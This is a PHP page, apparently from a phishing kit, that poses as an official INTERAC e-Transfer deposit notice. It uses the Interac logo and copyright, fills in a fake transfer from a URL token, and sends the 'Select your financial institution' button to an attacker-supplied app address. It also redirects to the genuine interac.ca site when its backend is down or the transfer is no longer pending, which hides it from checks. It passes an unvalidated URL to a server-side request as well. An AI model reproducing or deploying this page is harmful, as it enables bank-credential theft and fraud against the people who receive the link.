<?php
// deposit.php
$token = $_GET['token'] ?? '';
$error = false;
$data = [];

if ($token) {
    $decodedData = json_decode(base64_decode($token), true);
    if (is_array($decodedData)) {
        $data = $decodedData;
    } else {
        $error = "Invalid token payload.";
    }
} else {
    $error = "Missing token parameter.";
}

// Extract variables with fallbacks
$amount = $data['amount'] ?? '0.00';
$senderName = $data['senderName'] ?? 'Someone';
$recipientName = $data['recipientName'] ?? 'Customer';
$transactionId = $data['transaction_id'] ?? 'N/A';
$purpose = $data['purpose'] ?? 'Transfer';
$appUrl = $data['app_url'] ?? '';

$errorRedirectUrl = 'https://interac.ca/en/consumers/products/interac-e-transfer/';

// Gate logic
if (!$error && !empty($appUrl) && !empty($transactionId)) {
    $ch = curl_init(rtrim($appUrl, '/') . '/api/etransfer/status?tx=' . urlencode($transactionId));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode !== 200) {
        // Offline or connection error => Redirect immediately
        header("Location: " . $errorRedirectUrl);
        exit;
    }

    $statusData = json_decode($response, true);
    if (isset($statusData['status']) && in_array(strtolower($statusData['status']), ['cancelled', 'deposited', 'declined'])) {
        // Transfer is no longer pending => Redirect immediately
        header("Location: " . $errorRedirectUrl);
        exit;
    }
}

$continueUrl = !empty($appUrl) ? rtrim($appUrl, '/') . '/deposit?token=' . urlencode($token) : '#';

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deposit your INTERAC e-Transfer</title>
    <style>
        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #e5e5ea; }
        .header { background: #fff; padding: 16px 20px; text-align: center; border-bottom: 1px solid #ccc; }
        .header img { height: 32px; }
        .main { max-width: 400px; margin: 40px auto; background: #fff; border-radius: 12px; padding: 24px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        h1 { font-size: 20px; font-weight: bold; margin: 0 0 16px; text-align: center; }
        .amount-box { text-align: center; margin: 24px 0; }
        .amount { font-size: 36px; font-weight: bold; color: #333; }
        .amount-label { font-size: 14px; color: #666; margin-top: 4px; }
        .details-box { background: #f9f9f9; border-radius: 8px; padding: 16px; margin-bottom: 24px; }
        .detail-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eaeaea; }
        .detail-row:last-child { border-bottom: none; }
        .detail-label { color: #666; font-size: 14px; }
        .detail-value { font-weight: 500; font-size: 14px; text-align: right; }
        .select-bank-btn { display: block; width: 100%; background: #fcb813; color: #000; text-align: center; padding: 16px; border-radius: 8px; text-decoration: none; font-weight: bold; font-size: 16px; border: none; cursor: pointer; transition: background 0.2s; }
        .select-bank-btn:hover { background: #e5a40a; }
        .error-msg { background: #fee2e2; color: #991b1b; padding: 16px; border-radius: 8px; font-size: 14px; text-align: center; }
        .footer { text-align: center; font-size: 12px; color: #999; margin-top: 24px; }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://etransfer-notification.interac.ca/images/new/interac_logo.png" alt="INTERAC e-Transfer">
    </div>
    
    <div class="main">
        <?php if ($error): ?>
            <div class="error-msg">
                <strong>Error:</strong> <?php echo htmlspecialchars($error); ?>
            </div>
        <?php else: ?>
            <h1>Deposit your funds</h1>
            
            <div class="amount-box">
                <div class="amount">$<?php echo htmlspecialchars($amount); ?></div>
                <div class="amount-label">CAD</div>
            </div>
            
            <div class="details-box">
                <div class="detail-row">
                    <span class="detail-label">From</span>
                    <span class="detail-value"><?php echo htmlspecialchars($senderName); ?></span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">To</span>
                    <span class="detail-value"><?php echo htmlspecialchars($recipientName); ?></span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Message</span>
                    <span class="detail-value"><?php echo htmlspecialchars($purpose); ?></span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Reference</span>
                    <span class="detail-value"><?php echo htmlspecialchars($transactionId); ?></span>
                </div>
            </div>
            
            <a href="<?php echo htmlspecialchars($continueUrl); ?>" class="select-bank-btn">Select your financial institution</a>
            
            <div class="footer">
                &copy; <?php echo date('Y'); ?> Interac Corp. All rights reserved.
            </div>
        <?php endif; ?>
    </div>
</body>
</html>
